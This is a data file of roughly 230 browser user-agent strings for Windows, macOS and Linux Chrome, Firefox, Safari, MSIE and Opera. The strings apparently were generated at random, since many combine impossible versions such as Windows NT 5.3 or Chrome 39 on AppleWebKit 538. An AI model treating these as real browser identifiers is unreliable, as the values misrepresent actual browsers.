Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/39.0.833.0 Safari/538.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_8 rv:4.0; DA) AppleWebKit/536.0.0 (KHTML, like Gecko) Version/6.0.1 Safari/536.0.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:9.2) Gecko/20100101 Firefox/9.2.9
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.0.1 (KHTML, like Gecko) Chrome/34.0.801.0 Safari/538.0.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/7.0; .NET CLR 3.1.81760.4)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/20.0.878.0 Safari/536.1.0
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:9.0) Gecko/20100101 Firefox/9.0.1
Mozilla/5.0 (Windows NT 5.2; Win64; x64; rv:13.0) Gecko/20100101 Firefox/13.0.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5 rv:5.0; MS) AppleWebKit/536.1.0 (KHTML, like Gecko) Version/5.1.6 Safari/536.1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/7.0; .NET CLR 4.5.74328.1)
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:9.5) Gecko/20100101 Firefox/9.5.3
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_8 rv:4.0; EO) AppleWebKit/538.0.2 (KHTML, like Gecko) Version/5.1.1 Safari/538.0.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/6.1; .NET CLR 2.2.85096.9)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/531.1.2 (KHTML, like Gecko) Chrome/37.0.879.0 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/36.0.863.0 Safari/538.1.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; .NET CLR 3.3.23596.5)
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:13.0) Gecko/20100101 Firefox/13.0.3
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/34.0.831.0 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/37.0.891.0 Safari/536.2.2
Mozilla/5.0 (Windows NT 6.3; rv:5.7) Gecko/20100101 Firefox/5.7.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:10.6) Gecko/20100101 Firefox/10.6.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/21.0.801.0 Safari/532.1.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10.6; rv:10.9) Gecko/20100101 Firefox/10.9.9
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/533.1.0 (KHTML, like Gecko) Chrome/39.0.878.0 Safari/533.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.1 (KHTML, like Gecko) Chrome/29.0.855.0 Safari/537.0.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.3; Trident/7.1; .NET CLR 2.6.86597.0)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/23.0.888.0 Safari/538.1.2
Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0.8
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:9.1) Gecko/20100101 Firefox/9.1.1
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:9.8) Gecko/20100101 Firefox/9.8.7
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/13.0.836.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/32.0.807.0 Safari/533.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_3 rv:2.0; HR) AppleWebKit/532.1.0 (KHTML, like Gecko) Version/7.0.9 Safari/532.1.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/538.0.2 (KHTML, like Gecko) Chrome/21.0.887.0 Safari/538.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/27.0.892.0 Safari/532.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/27.0.894.0 Safari/531.2.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/6.1; .NET CLR 3.2.95865.5)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/532.2.2
Mozilla/5.0 (Windows NT 6.0; Win64; x64; rv:10.3) Gecko/20100101 Firefox/10.3.9
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/35.0.811.0 Safari/532.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/33.0.831.0 Safari/537.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/23.0.870.0 Safari/538.0.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:7.0) Gecko/20100101 Firefox/7.0.4
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/38.0.833.0 Safari/537.0.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/4.1; .NET CLR 3.3.51207.0)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/15.0.879.0 Safari/535.2.2
Opera/9.70 (Windows NT 5.1; U; ZH Presto/2.9.175 Version/12.00)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.1.1 (KHTML, like Gecko) Chrome/26.0.880.0 Safari/537.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/28.0.802.0 Safari/537.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.1.1 (KHTML, like Gecko) Chrome/20.0.805.0 Safari/534.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/32.0.813.0 Safari/534.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.1 (KHTML, like Gecko) Chrome/14.0.816.0 Safari/535.1.1
Mozilla/5.0 (X11; Linux x86_64; rv:15.3) Gecko/20100101 Firefox/15.3.8
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.1.0 (KHTML, like Gecko) Chrome/35.0.822.0 Safari/538.1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.2; Trident/3.1; .NET CLR 3.0.32872.0)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.0.2 (KHTML, like Gecko) Chrome/25.0.807.0 Safari/532.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_7)  AppleWebKit/533.0.1 (KHTML, like Gecko) Chrome/39.0.843.0 Safari/533.0.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/6.0; .NET CLR 4.6.19738.7)
Mozilla/5.0 (Windows NT 5.1; rv:5.8) Gecko/20100101 Firefox/5.8.9
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:12.5) Gecko/20100101 Firefox/12.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/531.1.1 (KHTML, like Gecko) Chrome/17.0.882.0 Safari/531.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/22.0.875.0 Safari/535.0.2
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:8.4) Gecko/20100101 Firefox/8.4.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/32.0.895.0 Safari/536.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5 rv:5.0; GA) AppleWebKit/534.0.0 (KHTML, like Gecko) Version/6.1.5 Safari/534.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/31.0.838.0 Safari/537.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4 rv:3.0; MN) AppleWebKit/537.2.2 (KHTML, like Gecko) Version/5.0.1 Safari/537.2.2
Mozilla/5.0 (Windows NT 5.1; rv:5.4) Gecko/20100101 Firefox/5.4.8
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/26.0.828.0 Safari/536.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/16.0.861.0 Safari/537.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/18.0.883.0 Safari/531.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/537.2.2 (KHTML, like Gecko) Chrome/16.0.892.0 Safari/537.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/30.0.868.0 Safari/535.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.1 (KHTML, like Gecko) Chrome/38.0.813.0 Safari/531.2.1
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:11.7) Gecko/20100101 Firefox/11.7.4
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/28.0.857.0 Safari/534.0.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; Trident/7.0; .NET CLR 3.9.85271.2)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/36.0.891.0 Safari/538.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.1.1 (KHTML, like Gecko) Chrome/17.0.881.0 Safari/531.1.1
Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:8.5) Gecko/20100101 Firefox/8.5.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6 rv:3.0; BE) AppleWebKit/532.2.0 (KHTML, like Gecko) Version/4.0.8 Safari/532.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.1.0 (KHTML, like Gecko) Chrome/36.0.834.0 Safari/534.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.1.0 (KHTML, like Gecko) Chrome/31.0.889.0 Safari/535.1.0
Mozilla/5.0 (Windows NT 6.1; rv:10.2) Gecko/20100101 Firefox/10.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/26.0.807.0 Safari/538.2.2
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:8.6) Gecko/20100101 Firefox/8.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/33.0.864.0 Safari/538.1.2
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:13.6) Gecko/20100101 Firefox/13.6.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/534.2.0 (KHTML, like Gecko) Chrome/33.0.898.0 Safari/534.2.0
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0.0
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:7.9) Gecko/20100101 Firefox/7.9.5
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/23.0.826.0 Safari/536.1.0
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; .NET CLR 2.1.76792.7)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.1; .NET CLR 4.7.80819.1)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.1.1 (KHTML, like Gecko) Chrome/15.0.873.0 Safari/536.1.1
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/537.1.2 (KHTML, like Gecko) Chrome/26.0.861.0 Safari/537.1.2
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:13.3) Gecko/20100101 Firefox/13.3.9
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/31.0.881.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/14.0.805.0 Safari/534.2.1
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/3.1; .NET CLR 3.6.82418.9)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.0.1 (KHTML, like Gecko) Chrome/13.0.863.0 Safari/536.0.1
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/3.1; .NET CLR 4.6.30092.9)
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.1.0 (KHTML, like Gecko) Chrome/37.0.849.0 Safari/531.1.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.2; Trident/5.1; .NET CLR 2.6.58789.6)
Mozilla/5.0 (Windows NT 5.0; rv:10.2) Gecko/20100101 Firefox/10.2.9
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6.5; rv:11.1) Gecko/20100101 Firefox/11.1.4
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/7.0; .NET CLR 4.0.35285.2)
Mozilla/5.0 (Windows NT 6.3; rv:12.1) Gecko/20100101 Firefox/12.1.8
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/23.0.868.0 Safari/533.1.1
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:9.6) Gecko/20100101 Firefox/9.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/18.0.866.0 Safari/538.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/534.0.0 (KHTML, like Gecko) Chrome/39.0.882.0 Safari/534.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/17.0.882.0 Safari/538.2.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_9 rv:4.0; LV) AppleWebKit/536.1.2 (KHTML, like Gecko) Version/4.1.3 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/30.0.813.0 Safari/534.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/532.2.2 (KHTML, like Gecko) Chrome/22.0.898.0 Safari/532.2.2
Mozilla/5.0 (Windows NT 5.0; WOW64; rv:7.4) Gecko/20100101 Firefox/7.4.5
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/38.0.839.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.1.2 (KHTML, like Gecko) Chrome/13.0.880.0 Safari/538.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/536.2.0 (KHTML, like Gecko) Chrome/36.0.829.0 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.2.1 (KHTML, like Gecko) Chrome/36.0.878.0 Safari/532.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/19.0.835.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.0.2 (KHTML, like Gecko) Chrome/30.0.855.0 Safari/537.0.2
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:6.8) Gecko/20100101 Firefox/6.8.8
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/26.0.855.0 Safari/535.2.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.0; rv:7.8) Gecko/20100101 Firefox/7.8.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9.7; rv:12.3) Gecko/20100101 Firefox/12.3.0
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_8_6)  AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/21.0.899.0 Safari/538.2.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/6.0; .NET CLR 3.1.22008.4)
Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_9_1 rv:3.0; SV) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/4.0.5 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.2.0 (KHTML, like Gecko) Chrome/29.0.890.0 Safari/538.2.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0.9
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/7.1; .NET CLR 3.2.72601.2)
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:11.8) Gecko/20100101 Firefox/11.8.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.2.2 (KHTML, like Gecko) Chrome/26.0.889.0 Safari/533.2.2
Mozilla/5.0 (Windows NT 5.0; WOW64; rv:13.1) Gecko/20100101 Firefox/13.1.7
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.1.2 (KHTML, like Gecko) Chrome/31.0.823.0 Safari/535.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/538.1.1 (KHTML, like Gecko) Chrome/37.0.864.0 Safari/538.1.1
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/533.1.1 (KHTML, like Gecko) Chrome/14.0.893.0 Safari/533.1.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_7)  AppleWebKit/535.0.0 (KHTML, like Gecko) Chrome/19.0.854.0 Safari/535.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/27.0.833.0 Safari/534.0.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.3; Trident/7.0; .NET CLR 1.2.73158.6)
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.2.0 (KHTML, like Gecko) Chrome/25.0.867.0 Safari/532.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/534.2.1 (KHTML, like Gecko) Chrome/16.0.807.0 Safari/534.2.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/28.0.858.0 Safari/538.2.1
Opera/10.22 (Windows NT 6.0; U; HE Presto/2.9.190 Version/10.00)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_5 rv:2.0; MO) AppleWebKit/531.0.1 (KHTML, like Gecko) Version/4.1.0 Safari/531.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.7) Gecko/20100101 Firefox/9.7.9
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/535.2.0 (KHTML, like Gecko) Chrome/21.0.842.0 Safari/535.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.0 (KHTML, like Gecko) Chrome/35.0.816.0 Safari/533.2.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.1; .NET CLR 1.2.87265.8)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/6.0; .NET CLR 1.9.79256.6)
Mozilla/5.0 (Windows NT 6.3; rv:6.2) Gecko/20100101 Firefox/6.2.1
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:9.5) Gecko/20100101 Firefox/9.5.0
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.3; Trident/5.0; .NET CLR 2.2.48402.4)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/537.2.1 (KHTML, like Gecko) Chrome/22.0.815.0 Safari/537.2.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.1; .NET CLR 1.8.21646.0)
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/537.0.0 (KHTML, like Gecko) Chrome/26.0.848.0 Safari/537.0.0
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:6.8) Gecko/20100101 Firefox/6.8.9
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.10855.3)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/534.2.2 (KHTML, like Gecko) Chrome/30.0.802.0 Safari/534.2.2
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:11.3) Gecko/20100101 Firefox/11.3.5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_0 rv:4.0; MY) AppleWebKit/536.2.2 (KHTML, like Gecko) Version/6.1.7 Safari/536.2.2
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_3 rv:5.0; LA) AppleWebKit/531.1.2 (KHTML, like Gecko) Version/7.1.4 Safari/531.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/533.2.1 (KHTML, like Gecko) Chrome/16.0.858.0 Safari/533.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/14.0.833.0 Safari/536.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/532.1.0 (KHTML, like Gecko) Chrome/35.0.820.0 Safari/532.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10.5; rv:14.3) Gecko/20100101 Firefox/14.3.8
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_5 rv:5.0; JV) AppleWebKit/536.2.0 (KHTML, like Gecko) Version/7.0.10 Safari/536.2.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/22.0.884.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/25.0.884.0 Safari/532.1.2
Mozilla/5.0 (Windows NT 5.1; rv:9.3) Gecko/20100101 Firefox/9.3.8
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/15.0.857.0 Safari/536.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/535.0.2 (KHTML, like Gecko) Chrome/23.0.893.0 Safari/535.0.2
Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/3.1; .NET CLR 3.3.73712.7)
Opera/14.9 (X11; Linux x86_64; U; RU Presto/2.9.171 Version/11.00)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10.0; rv:12.7) Gecko/20100101 Firefox/12.7.0
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:14.9) Gecko/20100101 Firefox/14.9.8
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/18.0.888.0 Safari/536.2.2
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/3.1; .NET CLR 4.4.29999.6)
Mozilla/5.0 (Windows; U; Windows NT 5.3) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/26.0.813.0 Safari/531.0.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4)  AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/24.0.812.0 Safari/533.0.0
Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_6_1)  AppleWebKit/536.1.0 (KHTML, like Gecko) Chrome/18.0.822.0 Safari/536.1.0
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/536.0.0 (KHTML, like Gecko) Chrome/14.0.887.0 Safari/536.0.0
Mozilla/5.0 (Windows NT 5.0; Win64; x64; rv:11.9) Gecko/20100101 Firefox/11.9.3
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/532.0.0 (KHTML, like Gecko) Chrome/29.0.816.0 Safari/532.0.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/533.0.0 (KHTML, like Gecko) Chrome/39.0.850.0 Safari/533.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.2.1 (KHTML, like Gecko) Chrome/32.0.822.0 Safari/538.2.1
Opera/14.54 (Windows NT 5.3; U; MG Presto/2.9.167 Version/10.00)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4 rv:5.0; BO) AppleWebKit/533.2.1 (KHTML, like Gecko) Version/7.0.8 Safari/533.2.1
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_10_4 rv:6.0; SE) AppleWebKit/532.2.0 (KHTML, like Gecko) Version/4.0.8 Safari/532.2.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/3.0; .NET CLR 3.0.84167.9)
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/27.0.841.0 Safari/537.2.0
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/535.2.2 (KHTML, like Gecko) Chrome/19.0.878.0 Safari/535.2.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_8 rv:6.0; KA) AppleWebKit/534.1.2 (KHTML, like Gecko) Version/7.1.0 Safari/534.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/31.0.857.0 Safari/536.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/26.0.889.0 Safari/535.2.1
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.1; .NET CLR 1.2.80300.8)
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.0.2 (KHTML, like Gecko) Chrome/20.0.802.0 Safari/536.0.2
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/532.1.2 (KHTML, like Gecko) Chrome/38.0.859.0 Safari/532.1.2
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/538.2.2 (KHTML, like Gecko) Chrome/14.0.828.0 Safari/538.2.2
Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/531.2.2 (KHTML, like Gecko) Chrome/30.0.891.0 Safari/531.2.2
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/4.0; .NET CLR 3.5.72147.7)
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/535.2.1 (KHTML, like Gecko) Chrome/14.0.831.0 Safari/535.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2) AppleWebKit/538.0.0 (KHTML, like Gecko) Chrome/20.0.803.0 Safari/538.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.3) AppleWebKit/532.0.1 (KHTML, like Gecko) Chrome/16.0.874.0 Safari/532.0.1
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/536.2.2 (KHTML, like Gecko) Chrome/21.0.836.0 Safari/536.2.2
Mozilla/5.0 (Windows; U; Windows NT 6.2) AppleWebKit/531.0.0 (KHTML, like Gecko) Chrome/36.0.876.0 Safari/531.0.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2 rv:5.0; LN) AppleWebKit/537.1.0 (KHTML, like Gecko) Version/6.1.6 Safari/537.1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_1)  AppleWebKit/534.0.2 (KHTML, like Gecko) Chrome/21.0.805.0 Safari/534.0.2
Mozilla/5.0 (Windows; U; Windows NT 6.1) AppleWebKit/531.0.1 (KHTML, like Gecko) Chrome/29.0.898.0 Safari/531.0.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.1; .NET CLR 1.0.34835.3)
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.0; Trident/4.0; .NET CLR 4.8.99040.5)
Mozilla/5.0 (Windows; U; Windows NT 6.0) AppleWebKit/537.2.0 (KHTML, like Gecko) Chrome/25.0.804.0 Safari/537.2.0
Mozilla/5.0 (Windows NT 6.2; rv:13.0) Gecko/20100101 Firefox/13.0.3
Mozilla/5.0 (Windows; U; Windows NT 5.0) AppleWebKit/536.1.2 (KHTML, like Gecko) Chrome/20.0.861.0 Safari/536.1.2
